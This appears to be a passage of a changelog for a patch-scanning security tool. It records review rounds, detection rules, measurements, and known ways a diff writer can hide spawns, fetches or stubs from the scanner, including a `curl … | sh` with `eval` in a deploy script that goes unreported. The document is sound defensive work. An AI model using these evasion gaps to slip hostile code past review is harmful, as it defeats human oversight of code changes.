    | 333,000 hunks joined by hints, old numbers forward and new numbers backward, each line a string left open | 159 MB, 0.79 s | 334 MB, 2.77 s | 319 MB, 3.43 s | 317 MB, 3.43 s |
    | 9,000 hunks that touch, each with nine long lines of context (51 MB of patch) | 111 MB, 0.95 s | 226 MB, 1.75 s | 226 MB, 1.69 s | 226 MB, 1.69 s |

    So the factor over the release is up to about two, as the review said, and the seventh
    text of this round costs nothing on these shapes (a run that two rules make is kept
    once).
  - *The same construct twice (IR8-L-3).* `std::process::` at the end of one hunk and
    `Command::new("b")` in the next give two items, one on each line. The second is what
    the next hunk gives read alone, and no reading is taken away for another; the score
    counts a signal once. It is in the list of limits now. The other half of that finding
    went with the entry below: the review's `e1` (a line that ends on `Kind::Command`) and
    `e3` (one that ends on `self.todo`) are silent, and are hard negatives in the corpus;
    and nothing is read at the beginning of a side any more, so the suspected case of a
    side that begins inside a comment and then holds `unwrap(` cannot arise.
  - *The list of what is still not found (IR8-L-4).* Added under what needs a writer: the
    third hunk with lines that claims a place (above), the construct cut twice and the
    function value cut before its name, the hunk an applier puts inside another. Added
    under what an ordinary diff can do: a file with no extension none of whose hunks shows
    a shebang has no language at all, so a `curl … | sh` and an `eval` added on line 20 of
    a script named `deploy`, in a plain `git diff -U3`, are not reported (in no version;
    full context shows line 1); a construct reported on two lines (above). Moved from
    writer to ordinary: a space before the bracket of a call in the other languages
    (`eval (source)`, `os.system (command)`, `fetch (u)`), which code that no formatter
    has touched writes. And the README no longer says that everything is monotone from one
    round of this branch to the next: a further reading only adds, and two changes took
    something back on purpose (the forms of the entry below; the joins this entry puts
    back).
  - *Tests (IR8-L-5).* The fuzz target `rust_hunk_places` has three more rules. Rule 10: two
    hunks that have old lines and touch by their old numbers, the new number of the second
    false, and beside them up to three hunks of added lines that name the same line,
    written before, between or after the two, with or without a hunk before them that ends
    the file: the construct is found. Rule 11: a removed test's attribute cut after `#[test`,
    `#[rstest`, `#[tokio`, `#[tokio::` or `#[tokio::test`, on removed lines (with the old
    side's forms deleted no rule used to fail). Rule 12: a script's shebang on a removed
    first line only, on an added one only, and a second hunk before or after it that begins
    with another language's shebang, removed, added or context: every item of the script
    with honest numbers is found. Its 28 seeds hold; on the sources of the commit before
    (`ceb2e6f`) rule 10 fails on ten of them, its own four among them. `evidence_scan` reads
    its lines as hunks of three as well (above). Planted in scratch copies, each of these
    fails the tests named: round 14's rule left out (the two join tests); a hunk with no
    line on the side counted like any other, in the order of the patch (the join test); a
    hunk that ends the run it begins not passed over (its own test); the kinds of a file
    worked out for each hunk, in the library and in the views (the two counting tests); the
    name in angle brackets read whatever stands before the `<` (the spellings test). And
    in the fuzz target, each rule run alone over the 28 seeds: with the old side's forms
    deleted rule 11 fails on 25, with a shebang read on the new side only rule 12 on 4,
    with a hunk that has no line on the side counted like any other rule 10 on 2. The
    corpus has 51 cases (new: `evidence/independent-review-8-20261115`, seven expected
    items, eight declared misses, four hard negatives): evidence precision 163 of 183 (was
    156 of 176), recall 163 of 230 (was 156 of 215), 90 declared (was 82).
  - *Compared, on the final binary.* 5,748 existing patches of every review and the corpus,
    rank, full answer and the bounded list: against release 0.8.3, nothing lower in score,
    2,424 patches with something gained, and one line of difference that is the two
    entries of one path changing places (a second section for one path, as before);
    against round 14, nothing lost in the full answer and one patch in the list (the
    declared trade of the list of 32, which keeps the release's items); against round 15,
    nine patches report less, every one of them a form the entry below took back (a bare
    word at the end of a side, a call at its beginning, the first of two sections). The
    review's 55,000 generated patches: against round 14, 0 lower in the full answer (in
    the list of 32, 74, each a file whose list is cut on one side or both: the same
    trade); against release 0.8.3 with the views checked against the rank, 0 lower (29,118
    with something gained, and every view agrees with the rank); against round 15, 1,432
    report less, and between the build that has only the change of the entry below and
    the final one, 2 do (above). Every line of 603 crates, of this repository's sources and
    of its history's changed lines as a one-line hunk, again: item for item what the entry
    below measured, and what it is with no form read at the end of a side.
- **Round 15 of Vesper's review (NO-GO on one finding): the end of a hunk side is read only
  where it is evidence by itself.** Vesper found every finding of the two reviews before
  closed, the memory figure accurate and the dependency on release 0.8.4 acceptably stated.
  - *A bare name at the end of a side is no construct (VD3R15-M-1, an ordinary diff).* The
    entry below read the end of a hunk side as the beginning of a construct for a list of
    forms, among them the bare first name of a path release 0.8.3 keys a signal on. A file
    with `struct Command;` and `pub fn command() -> Command`, its brace on the next line,
    changed on that line: `git diff -U0` writes a one-line hunk that ends on `Command`, and
    it was reported as `process_spawn`, weight 4, in a file that spawns nothing. The
    measurement behind that list had no line of this shape: it cut files at fixed lines and
    read history at three context widths, and a line of code that ends on a type's name with
    nothing after it is rare in rustfmt's style and ordinary in others.
  - *The rule now.* A form is read at the end of a side only when what the side shows is by
    itself evidence of the construct: the word it is known by WITH the token that makes it
    that construct, and no line of honest code ends that way. Every form the entry below
    built was gone through with that question:

    | Form at the end of a side | An honest line that ends so | Now |
    | --- | --- | --- |
    | `Command`, `TcpStream`, `UdpSocket`, `reqwest`, `ureq` (bare) | `pub fn command() -> Command` | not read |
    | `Command::`, `process::`, `TcpStream::`, `UdpSocket::` | none | read |
    | `.unwrap`, `.expect` | `let n = self.expect` (a field, at the head of a chain; such fields are in real crates) | not read |
    | `::unwrap`, `::expect` | `Self::expect` (a function as the value of a block) | not read |
    | `.unwrap::`, `.expect::`, also with `<` | none (no field has generic arguments) | read |
    | `todo`, `unimplemented` (bare) | `let rest = todo` (a variable) | not read |
    | `todo!`, `unimplemented!` | none | read |
    | the name of an assertion, bare or with `!` | none with `!`; but it says nothing of an assertion that cannot fail | not read |
    | `assert_eq!(true`, `assert_eq!(true,` | `assert_eq!(true,` with a value on the next line | not read |
    | `assert!(true`, `assert_eq!(true, true` | none | read |
    | `#[ignore`, `#![ignore`, `#[allow`, `#![allow` | none | read |
    | old side: `#[test`, `#[rstest`, `#[tokio`, `#[tokio::`, `#[tokio::test` | none | read |

    And the beginning of a side is not read as the end of a construct at all. The entry
    below read `unwrap(`, `expect(`, `ignore]`, `ignore =`, `[ignore]`, `[allow(`,
    `::Command` and, on the old side, `test]`, `test(` and `tokio::test` there. A line of
    honest code begins with `expect(&value, 3);` (a function of the crate's own), with
    `test(&[], 1);` and with `ignore = true;`, and none of the others shows the head that
    makes it the construct.
  - *Measured on the shape that makes edges.* Every line as a one-line hunk that removes
    the line and adds it again (`@@ -N +N @@`, a one-line change in `git diff -U0`): every
    line end and every line start is then an edge. 7,911,652 lines of 18,450 Rust files of
    603 crates, the 93,551 lines of this repository's own Rust sources, and the 121,309
    changed lines of its history. Fires of each form the entry below built or weighed
    (crates, sources, history); none of them is an item the file has on that line:

    | Form | Fires |
    | --- | ---: |
    | start `()` (weighed, not built) | 617, 1, 1 |
    | start `!(` (weighed, not built) | 123, 1, 1 |
    | start `test]` or `test(`, old side (built) | 70, 0, 0 |
    | start `expect(` (built) | 58, 3, 3 |
    | start `ignore =` (built) | 24, 0, 0 |
    | end `ureq`, bare (built) | 1, 0, 0 |
    | end `process`, bare (weighed) | 1, 0, 0 |
    | every other form, built or weighed, at either edge | 0, 0, 0 |

    So the forms that fired are gone, and so are those that an honest line can end with
    though none of 8.1 million did: this set, too, has no line that ends on a bare `Command`
    (Vesper's file has its brace on the next line, which rustfmt does not write), so the
    measurement alone would not have caught Vesper's case: the question whether an honest
    line can end so decided it. From now on a form is read only when BOTH hold: no line of
    honest code can end that way, and the form does not fire on this set. With the forms
    that are still read, the
    answer on all three sets is the same item for item as with no edge read at all
    (153,212 items on the crates, 4,801 on the sources, 3,164 on the history).
  - *What is lost by it.* A construct cut by two hunks that nothing joins is found only when
    the first half ends on a form that is still read. A call cut after `.unwrap` or
    `.expect`, a path cut after its bare first name (`Command`, then `::new`), an assertion
    cut before its `true`, and any construct cut before its word are declared misses again,
    as they were before the entry below; so is what the first of two sections for one path
    ends on. Each takes a writer who sets out to (both numbers of the second hunk false, or
    a second section), and none is in an honest diff. One true number of the second hunk,
    the old or the new, still joins the two hunks and finds the construct, and release 0.8.4
    refuses the second section.
  - *Tests.* The reader's tests hold every form that is read, the honest lines that are
    not (Vesper's among them) and the beginning of a side; the file-level test holds the
    cut pair for what is found and what is not, and Vesper's patch as Git wrote it; the
    pinned test of the two sections expects nothing again. The fuzz target
    `rust_hunk_places` cuts only the forms that are read (rule 7) and has a new rule 9: a
    line of honest code as a one-line hunk, at any position, reports none of the signals
    whose constructs its last or first word begins. Its 20 seeds hold; on the sources of the
    commit before (`ceb2e6f`) rule 9 fails on every one of them. The corpus has the same 50
    cases: the seventh review's case gained two expected items (a stub cut after `todo!`, a
    spawn cut after `Command::`, both numbers false) and nine hard negatives (Vesper's
    patch, a return type `TcpStream`, a field of type `UdpSocket`, a line that ends on
    `reqwest`, a variable named `todo`, a field named `expect`, an assignment to `ignore`,
    a removed call of `test`, a call of `expect`), lost its declared false positive for
    that call, and three of its items and one of the sixth review's are declared misses
    again: evidence precision 156 of 176 (was 158 of 179), recall 156 of 215 (was 158 of
    213), 82 declared (was 79).
- **Round 14 of Vesper's review and a seventh independent review (both NO-GO): no header
  number decides what is found; the bounded list is claimed for what it is.** Both reviews
  found the joins of the round before sound (no loss of the first build's kind in 587 crate
  files cut four ways, 26,306 hunks with context, 483 history patches at three context
  widths), and the released reading, the views against the rank, the cost and the corpus
  figures as stated. What they broke: a number that was still believed, in a place that
  round did not look (the language of a file); the model of `git apply` in the documents;
  a claim about the list of 32 that a list of 32 cannot keep; and four ways a construct went
  unreported that the list of remaining ways did not have.
  - *The model of `git apply`, corrected (IR7-L-3).* The entry before this one, the README
    and the doc comments said that plain `git apply` places a hunk by its OLD position and
    never uses the new one. It is the other way round. Git 2.56.0, run in scratch
    repositories: with the same four lines at 1 to 4 and at 9 to 12 of a file,
    `@@ -9,4 +1,5 @@` is applied at line 1 and `@@ -2,4 +9,5 @@` at line 9, each with no
    message; `@@ -30,4 +6,5 @@` "succeeded at 9 (offset 3 lines)", the nearer place to line
    6; `@@ -1,4 +9,5 @@` "succeeded at 1 (offset -8 lines)". Git looks for the hunk's old
    lines starting at the NEW position and going outward; the old position is read for one
    thing, 0 or 1, which says the hunk must be at the beginning; a hunk whose last line is
    not a context line must match at the end. A hunk of added lines only (`@@ -5,0 +6,1 @@`)
    goes to the end of the file for plain Git ("succeeded at 15 (offset 9 lines)") and to
    its NEW position with `--unidiff-zero` (line 6; written `+1`, line 1). The rule for the
    top of a file (old position 0, or 1 with an old line; the first hunk of a creation) was
    right and stays. Every sentence is corrected, and the wrong ones in the entry before
    this one are marked there.
  - *The language of a file (IR7-H-1, high; lower than release 0.8.3).* A file whose name
    gives no language takes it from a shebang. Release 0.8.3 read the shebang from the first
    hunk when the header said its new side starts at line 1; round 14 moved that to the
    hunk Git must put at the top, which rests on the header's old number. A script's hunk
    written `@@ -4,3 +1,5 @@`, which Git applies at line 1 in silence, then had no language
    at all: a fetch and an `eval` that release 0.8.3 and round 13 report (score 9) went
    unreported (score 2). The same hunk written `+4` was silent in every version, and so
    was the shebang hunk written second in its section. Now no number decides it: the file
    is read under the language release 0.8.3's rule gives, which is kept exactly as the
    floor, and under every other language that a shebang names on the first line of the old
    or the new side of ANY of its hunks; what the readings find is united, as for every
    further reading. The cost is a text file with no extension in which a hunk begins on a
    line that reads as a shebang: it is read as that language too.
  - *The mark of release 0.8.3 outside Rust (IR7-L-1).* An item is that release's when that
    release found it, under ITS rule for the language. Round 14 marked what today's reading
    of the hunk alone finds; where the two disagree on the language (the script above with
    `@@ -1,3 +5,39 @@`: no language to that release, shell today) 34 fetches were marked,
    and the one item that release lists, a secret on the last line, was not in the list of
    32. It is now.
  - *Joins on the hint of either number (IR7-M-2, IR7-L-3).* Two hunks that touch are read
    together when their old numbers say so or their new numbers do; round 14 took the old
    one only, which is the one Git never reads past 1. A hunk with no line on a side counts
    on that side as standing after the line it names, as an earlier hunk too
    (`@@ -2,0 +3,1 @@` and then `@@ -3,1 +4,1 @@`, true numbers: plain Git refuses the pair,
    `--unidiff-zero` puts them together; round 14 joined them only when they were written
    the other way round). The hints are taken twice: beside the joins Git must make, where
    a number that contradicts one is not taken, and alone, as an applier takes them that
    goes by the numbers and puts nothing at the end of the file. A hunk stands in at most
    six texts (three in the round before), and a run two hints make is read once: a patch
    with true numbers and context is read as before. (Corrected 2026-11-15 after the eighth
    independent review, IR8-M-1: as built here, a hunk with no line on a side could take
    the place of the hunk that truly ended before a line, and joins that round 14 made
    were lost. The entry for that review, above, has the rule that replaced this one;
    seven texts since.)
  - *Corrected 2026-11-15 (the entry above this one).* Of the forms listed under "The edge
    of a side" below, only those are still read that are evidence by themselves, and
    nothing is read at the beginning of a side: a bare `Command` at the end of an honest
    line was reported as a spawn. The corpus figures and the fuzz controls of this entry
    are those of its day.
  - *The edge of a side (the declared false-position pair; the review's idea).* Two hunks
    that touch behind numbers that do not say so are joined by nothing, and no rule built on
    numbers or on the order of hunks can close that (`cutpair.patch`: one digit, no message
    from Git). The start of a side was already read as unknown; now its end is too. A side
    that ends on the word a construct is known by, with the rest missing, reports the
    construct with basis `hunk`: `.unwrap`, `.expect`, `::unwrap` (also with `::` or `::<`
    begun); `todo`, `unimplemented` and the assertions, alone or with `!`, and an assertion
    as far as its `true`; `#[ignore`, `#[allow`; `Command`, `Command::`, `process::`,
    `TcpStream`, `UdpSocket`, `reqwest`, `ureq`; on the old side a test's attribute as far
    as it goes. And a side that begins with the word and what follows it, the head missing:
    `unwrap(`, `expect(`; `ignore]` and `[ignore]`; `[allow(`; `::Command`; on the old side
    `test]`, `tokio::test`. Measured before it was built, on 177,957 fragments of real
    crate files in two cuts, this repository's history at `-U3`, `-U1` and `-U0`, and 603
    crates as created files: no side ends in any of these ways, and two sides begin with a
    call of a function of the crate's own named `expect` (`chrono`, `indexmap`), which are
    the two false items the rule adds, when that line is a changed one. Forms that real
    code does end or begin lines with were measured and NOT taken: `assert!(` at the end
    (279 sides), a bare `#` or `#[` (16), a `cfg_attr(` list left open that does not end on
    `ignore` (217), `(` at the start (4,279), `!(` at the start (2), and `allow(` or
    `ignore,` at the start (a function and an argument can have those names). So the
    construct is found when the cut stands beside its word, whatever the numbers and the
    order of the hunks, and not when it stands after an assertion's bracket or inside a
    `cfg_attr` list before its `ignore`. (That sentence was not true, and is withdrawn:
    eighth independent review, IR8-M-3. A word cut on BOTH sides, alone in a hunk of its
    own, was at no edge, and a function passed as a value was not read cut before its
    name. The entry for that review, above, says exactly which cuts are found.)
  - *The paths of release 0.8.3's signals, as tokens (IR7-M-3; in release 0.8.3 too).*
    `process_spawn` and `network_fetch` are keyed on `Command::new`, `process::Command`,
    `reqwest::`, `ureq::`, `TcpStream::connect` and `UdpSocket::bind`, each looked for as
    one string on one line. `std::process :: Command :: new("sh")`, the path over three
    lines, and `Command` with `::new` on the next line compile, run, and were reported by no
    version. The reader of tokens now reads these paths, and `#[allow(` and `#![allow(`,
    with white space, comments and line ends between their tokens, beside the one-line
    rules, which stay as they are (they are the floor, and they also read the released
    view). Nothing more is modelled than that release keyed on: an alias that never writes
    the names (`Command as C`, `C::new`) is not read, there or here. On every set measured
    the token reading of these paths adds no item: formatted code does not write them so.
    Two spellings of a suppressed lint that were declared misses are found by it (a comment
    inside the attribute, the attribute over two lines).
  - *A second section for one path (IR7-H-2).* A file created as `let v = opt.unwrap`, and
    a second `diff --git` for the same path whose hunk begins `();`: plain Git applies both
    sections to the one file, and to this crate they are two files that nothing joins. The
    fix is the parser's: release 0.8.4 refuses a path named by more than one section, and
    this branch stands on 0.8.3. **This branch must not be merged before it stands on that
    refusal**; the README and the head of `evidence.rs` say so, and a test pins today's
    answer with what it must become after the rebase (the patch refused). Until then the
    review's patch is found at the edge (the first section ends on `.unwrap`), and a second
    section that goes on in a string or a comment the first left open is a declared miss
    in the corpus. A rename of a file the patch creates, with a change to the new name, is
    not another way to it: plain Git refuses that ("No such file or directory").
  - *The raw-string start (IR7-M-1, an ordinary diff).* A side that began inside a raw
    string was read with the count of `#` of its first quote that has any. A page kept in
    `r##"…"##` holds `href="#top"`: the count was 1, the string ended at the wrong quote,
    and with a link's `//` between quotes no other reading had the code after the string
    either. The plain `git diff -U3` of such a test lost both its panic paths. The quote
    that ends a raw string has more `#` after it than any quote of the string's own text,
    so it is a quote that sets a record of `#` in the side; the side is now read from
    inside a raw string once for each such record, four at most. On 7,758 hunks that begin
    inside a raw string (every raw string with `#` that runs over lines in the `.rs` files
    of the 603 crates, cut three lines before its end, with the six lines after it as the
    change): 369 true items, 3 missed before and none now; false items 4 before and 4 now.
    Of 177,957 fragment sides, 5,061 have one record, 65 two, 18 three, 5 four, none more.
    Past four the string's end is not read: a declared miss, with a corpus section. The
    entry before this one listed this limit under what "needs a writer"; it is ordinary.
  - *The bounded list, claimed for what it is (VD3R14-M-1, IR7-L-5).* A list of 32 cannot
    keep every item round 13 listed and every item release 0.8.3 listed. The rule stays
    (that release's items first). The claim is: the full set of items, the signals and the
    score are monotone, since every reading only adds; the list of at most 32 keeps release
    0.8.3's items and is not a superset of an earlier round's list. The entry before this
    one said that only one patch lists less than round 13 did; that comparison had been run
    without the items of files whose list is cut short. With them, round 13 to round 14
    loses listed items in 14 of 621 patches of the sixth review's set: one by the rule for
    the top of a file, 13 by the bound (a panic path of `tests/repo_scripts.rs` gives its
    place to the spawn on line 368 that release 0.8.3 listed). A test holds the trade as it
    is.
  - *A view of one hunk of a long run (IR7-L-2).* A view of one hunk that is read together
    with others took its labels from the scan of the whole file, which reads every hunk
    alone as well as in its runs. It now reads the texts that hunk stands in and no other
    hunk. In a file of 330,000 hunks (CPU seconds, busy host; round 13, round 14, now):
    created in that many hunks, 1.0, 4.1, 1.7; hunks of added lines only, the shape of
    `git diff -U0`, 1.0, 4.4, 1.7; hunks that touch by their numbers, 1.0, 5.0, 2.7. What
    is left is one reading of the run, whole: what stands before the hunk decides how it
    starts, and what stands after it can complete a construct it begins and decides which
    starts the run is read from, so stopping at the hunk would give another answer than the
    rank. The library functions `hunk_signals` and `hunk_signals_alone` take the hunk's
    place in its file: passed a copy of a hunk, they used to read it alone, or as no first
    hunk, without a word.
  - *The memory of a file of very many joined hunks.* A file created as 499,000 hunks of
    one line (`--rank`, peak resident memory): release 0.8.3 176 MB, round 13 176, round 14
    293, now 263. (Right for this shape and low for others: the entry for the eighth
    independent review, above, has three shapes, IR8-L-2.) Round 14 held a text for every
    hunk read alone beside the joined ones (now
    none: each hunk is read alone as the scan goes over the file, and nothing is kept for it
    but what it gives), a second table of answers for a file read as one kind (now one), and
    in the views a set of the ids of the joined hunks (now one flag a hunk, and
    `joined_hunks` gives those flags: a view of the file's hunks by path took 315 MB and
    takes 270, the release 186). Through the protocol, where the request and the answer are
    most of the memory, every view is within 2 MB of the release (a page of the outline 382
    against 380; every hunk asked for by address in reverse order 724 against 724). What is
    left over the release for `--rank` is the reading of the run itself: the code view of
    every line of a text is held while the rules and the reader of tokens go over it, as
    for any long hunk since round 13 (the same 499,000 lines written as one hunk: 54 MB in
    the release, 131 in round 13, 120 in round 14 and now). A reading that hands each
    line's view to the rules as the lexer makes it, and keeps the reader's window and one
    line ahead, would end that for runs and long hunks alike; it changes how every reading
    is plumbed and is not in this round.
  - *Measured, against round 14.* On 177,957 fragments of real crate files in both cuts,
    25,208 more whose true start is known, this repository's history at `-U3`, `-U1`, `-U0`
    and full context (577 patches each) and 603 crates read as created files: nothing is
    lost, and three items are new, all false: a call of a function of the crate's own named
    `expect` or `unwrap` on a changed line that begins a side (two on the fragments, one on
    the fragments with known starts). The language rule, the joins on either number, the
    raw-string readings and the token reading of the released paths change no answer on any
    of these sets. Against the published 0.8.3 binary on 3,062 patch files (the sets of
    every review, the corpus and the seventh review's reproductions), with every listed
    item compared also where a list is cut short and the score of every file: no patch has
    a signal, a listed item or a score of that release that this version does not have (the
    same comparison finds two such patches for round 14, one of them with a lower score).
    Against round 14: no patch loses a signal or an item of a full list; 35 change, all by
    gaining (the seventh review's 13; 19 in which a suppressed lint is now read as tokens;
    the corpus sections whose declared misses are found; one hostile patch of 26,000 hunks
    that are each the word `todo`, which is now a stub at an edge); and with cut lists
    compared one patch lists one item less, by the bound (the script of IR7-L-1: a fetch
    gives its place to the secret that release listed). Against round 13: without cut
    lists, the two patches of the rule for the top of a file; with them, 157 of the 3,062
    list fewer of round 13's items (round 14: 160), which is the bound and nothing else.
    Cost (CPU seconds and peak memory, the best of three runs on a busy host, so the ratios
    say more than the seconds; round 13, round 14, now). The sixth review's ten inputs and
    three files of 330,000 joined hunks: between 0.6 and 1.5 times round 14's time, the
    median the same, and its memory within 4%. The thirty-four hostile units of two
    megabytes: the median the same as round 14, the slowest 1.8 s (2.2; 0.9). Where an input
    asks for every reading this round adds: a file of 100,000 hunks that begin with the
    shebangs of three languages in turn is read as each, 0.20, 0.22 and 1.26 s with 48, 59
    and 86 MiB; a side with a quote for every count of `#` up to 1,400 is read for four of
    them, 0.11, 0.26 and 0.30 s; 330,000 hunks that the old numbers chain one way and the
    new numbers the other are read as each run, 2.6, 4.6 and 6.2 s with 173, 324 and 337
    MiB; and 165,000 pairs of touching hunks take 1.7, 3.8 and 4.9 s with 174, 212 and 231
    MiB. (As this round was first built, a run that a number made was looked for among all
    the runs of its file, and those pairs did not finish in two minutes: found before any
    commit. A run is now looked for among the runs that begin with its first hunk, and a
    test holds the cost of 60,000 pairs.)
  - *Tests.* Unit tests hold: the language of a script under five headers, with the shebang
    hunk second, with the shebang on the old side only, with two languages, and its cost;
    the mark of the release under its own language rule; as a property over 600 generated
    scripts under five renumberings and reorderings, that what the true numbers give is
    given and that the marked items are that release's; the joins on either number, the
    pair in both orders, the run for each number and the bound; the records of a raw
    string, the review's page and the bound; the released paths and `#[allow(` as tokens;
    every form the end and the beginning of a side are read for, and the forms they are
    not; a call cut by hunks that nothing joins; the second section, pinned; the list's
    trade. The fuzz target `rust_hunk_places` (IR7-L-4 said what it could not see) has
    three new rules: a construct only a join reads is found when either number says the
    hunks touch, with the first hunk with or without an old line and in both orders (6); a
    construct cut beside its word is found whatever the numbers and the order (7; that rule
    and its sentence are withdrawn, as the sentence above is: rounds 16 and 17 narrowed what
    the end of a side is read for, and since round 17 rule 7 holds only a call cut after
    `.unwrap::` or `.expect::`, the one form left; ninth independent review, IR9-L-5); every
    item of a script's hunk with honest numbers is found under false ones and with the hunk
    written second (8). Rules 2 and 3 also run with removed lines, and a raw string's text
    may hold quotes. It has 18 seeds. On the sources of the commit before (`87d1afd`), each
    rule run alone: rules 6 and 7 fail on every seed, rule 8 on the two script seeds, and
    the raw-string seed fails the older rules; the seed with removed lines holds there
    too. The corpus has 50 cases (new:
    `evidence/independent-review-7-20261115`, twenty items, two declared false positives,
    five declared misses; three declared misses of the case before it are found, and one
    item of the first independent review's case is new, an inner `#![allow(…)]` written as
    `#!`, a comment and the rest): evidence precision 158 of 179 (was 134 of 153), recall
    158 of 213 (was 134 of 187), 79 declared (was 75).
  - *Where a number of a header still decides something.* The printed line of an item
    (where it is reported, not whether). The joins on a hint (they add readings; every hunk
    alone and the edges do not depend on them). The floor of the language (release 0.8.3's
    rule, beside the rule that reads every hunk). And old position 0 or 1, which makes a
    hunk the top of its file, read from code only: the one number plain Git obeys. A hunk
    written `@@ -1,L` whose old lines stand lower is refused by plain Git and applied lower
    by `--unidiff-zero` and `-C0`; it is the one declared limit that rests on a number.
- **Round 13 of Vesper's review and a sixth independent review (both NO-GO): nothing about a
  hunk's place or start is taken on trust.** Both reviews confirmed the model of round 13
  (whole views, no mixture, a further view only adds, each view lexed as the compiler lexes
  it, the other languages unchanged). What they broke is everything that round still took
  from the patch on its word: the numbers in a hunk header, the boundaries between hunks, and
  a guess at how a fragment starts. A third report, on the port of the Rust scanner to the
  released line, showed that the new scanner reports less than release 0.8.3 on some hunks.
  - *Corrected 2026-11-15 (the entry above this one).* Where this entry says that Git
    places a hunk by its old position, that the new position is never used, or that
    `@@ -9,4 +1,5 @@` "is applied at line 9", read: Git starts looking at the NEW position
    and that hunk goes to line 9 only when its lines stand there and not at line 1. Where
    it says that one patch lists less than round 13 did, read: 14 of 621 with the items of
    cut lists compared. And a raw string whose text holds `"#` is no writer's work but an
    ordinary diff's.
  - *The rule.* Where a hunk sits is what plain `git apply` must do with it. Hunks with no
    unseen line between them are one text, and every hunk is also a text of its own: a join
    is a further reading and takes none away. Where the start of a text cannot be known,
    every start that could be true is read, and what any reading finds is found. Every claim about
    Git below was run with `git apply` 2.56.0 in scratch repositories, and the runs are
    written into the doc comments of the tests that hold them.
  - *The top of a file (IR6-H-1, high).* A side counted as the top of its file when its
    first line had the number 1, and for the new side that number is the `+N` of the header.
    Git never places a hunk by it: `@@ -9,4 +1,5 @@` is applied at line 9 ("succeeded at 9
    (offset 8 lines)"). One digit switched the readings from inside a comment and a string
    off and the shebang rule on, and a spawn on a line `#! ...` inside a macro call, which
    every earlier version reported, was blank. The top of a file is now where Git must put
    the hunk: old position 0, or old position 1 in a hunk that holds a line of the old file
    (with any other, Git puts the hunk where it finds its old lines), and the first hunk of
    a section that creates a file, whatever its header says. A hunk `@@ -1,0 +N @@` of added
    lines only in an existing file is a fragment: its readings include the one from code,
    and the one from the top of a file when its first line is a shebang, so nothing the top
    reading gives is lost.
    A hunk that says it is lower can still be the top (`@@ -3,2 +3,3 @@` whose lines are
    the first of the file is applied at line 1), so a fragment whose first line is a shebang
    is also read from the top of a file. The sentence in the entry before this one and in
    the request for round 13, that `git apply` puts a hunk at line 1 by its new number
    "unless it is run with `--unidiff-zero` or `-C0`", was wrong and is corrected. One
    answer changes the other way and is right: a hunk `@@ -1,3 +7,4 @@` is the top of its
    file, and a line `// */ call(); /*` in it is a line comment (the review's `asym.patch`).
  - *Hunks Git must put together (IR6-H-3, high; in release 0.8.3 too).* Each hunk was read
    alone, and Git accepts a file created as several hunks: a call whose name ended the
    first hunk and whose `()` began the second left no item, and a comment opened in the
    first hid a spawn in the second. A hunk whose last line is not a context line must match
    at the end of its file, and a hunk of added lines only has nothing else to match, so
    such a hunk stands straight after the last earlier hunk that ended the file whatever its
    header says (`@@ -50,0 +90,1 @@` after `@@ -0,0 +1,2 @@` is line 3). A file created as
    several hunks is therefore one text from line 1, and so is a run of such hunks at the
    end of an existing file: the state of the lexer and the window of the reader of tokens
    run across the join, and each item is reported with the hunk and the line it stands in.
    Hunks whose old positions say they touch are read as one text too.
    *Every hunk is also read on its own*, in every language and whatever joins it: what a
    hunk gives when it is read alone is always in the answer. The applier modelled is plain
    `git apply`; an applier that puts a hunk where its numbers say leaves such hunks apart,
    each a fragment of its own, and the reading of every hunk alone is that reading. As this
    round was first built (never committed), a Rust hunk that Git must put after another
    was read only as its continuation, and that lost what round 13 reported: two hunks of
    added lines only in an existing file, the first leaving a block comment open, the
    second a spawn and a call. Plain `git apply` puts both at the end of the file ("Hunk #1
    succeeded at 23 (offset 17 lines). Hunk #2 succeeded at 25"), where the second is the
    text of that comment; `git apply --unidiff-zero`, which a `git diff -U0` patch needs,
    puts each where its numbers say, and rustc compiles the second as code. Both readings
    are made now. With every hunk a text of its own, a hunk stands in at most three texts
    (itself, the run Git must make, the run the positions make), so the bound on joins by
    position that the first build had (eight a file) is gone and nothing replaces it.
    `git diff` with context lines writes neither touching hunks nor a creation in several
    hunks: on the 481 per-commit patches of this repository no answer changes for this
    reason. The views that show hunks take the labels
    of a joined hunk from the one scan of its file; a hunk that is a text of its own is
    still scanned alone (`hunk_signals_alone`, `joined_hunks`).
  - *The starts of a fragment (IR6-H-2, high; LF-H-1).* The reading from inside a string
    was made only for a side that, read from code, ENDED inside a string. An ordinary
    `diff -U3` hunk between two strings over lines (the closing line of one above its
    change, the opening line of the next below) ends in code, and every item of such a hunk
    was lost, `#[ignore]` on a test among them, which rounds 10 to 12 had found; and a hunk
    that began in a string whose text holds `crates/*/*/Cargo.toml` ends in a comment (two
    opened, one closed), which lost a spawn that release 0.8.3 reports. The condition is now
    that the reading from code carries anything over a line end: a string, a raw string or a
    block comment. On the same condition a side that holds a quote with `#` after it is read
    from inside a raw string too: a raw string takes no escapes and ends at the first quote
    that as many `#` follow as opened it, and the count is that of the side's first such
    quote, which is the string's closing quote unless its own text holds one (so one reading
    serves any count; read as an ordinary string, a raw string whose text ends in a
    backslash does not end where it ends).
  - *Never less than the released version (LF-H-1, LF-M-1).* The scanner that follows the
    compiler's lexer is right about text read from a known start, and a hunk has none: from
    a start that is wrong, being exact goes wrong in other places than the old scanner did.
    So the scanner of release 0.8.3 is back beside it, byte for byte as released (a private
    module, `lexical/legacy_rust.rs`: lines 119 to 841 of `lexical.rs` at the tag's commit
    `d4dbc91`), and every Rust hunk is read once more as that release read it: alone, from a
    fresh state, by that release's own Rust rules. What it finds is united with the rest.
    (Letting every rule of today read that view too was measured and not taken: it gains no
    true item on any set, adds 5 false items on this repository's history and 16 on 603
    crates read as created files, costs a third more time on created files, and it breaks
    the rule the fuzz target `rust_tokens` has held since round 13, that strings on earlier
    lines change none of the reader's signals.) Checked against the published 0.8.3
    binary on every set named below (2,121 patch files that both binaries read): the list
    of patches in which a signal of that release is reported by 0.8.3 and not by this
    version is empty. The cost is what that scanner got wrong and the release also
    reported: text of strings and comments taken for code (figures below), and about what
    that release's scan took in time.
  - *The general answer: do not guess the start.* A text that Git must put at the top of
    its file is read from code and in no other way, and that reading is exact. So a patch
    made with full context (`git diff -U<large>`) has no unknown start, and the
    constructions that no reading of a bare fragment covers are found in that form (tests
    and a pair of corpus sections hold four of them). The README says so to whoever builds
    patches for a gate. The rule that was measured and NOT taken, "code may begin wherever a
    comment or a string could end", closes every start-related construction and costs 2.8%
    more items on real fragments and 10.7% on this repository's history, nearly all false
    (doc examples in line comments); sparing line comments reopens them; and it needs a cap
    with a known residue or a new reading engine.
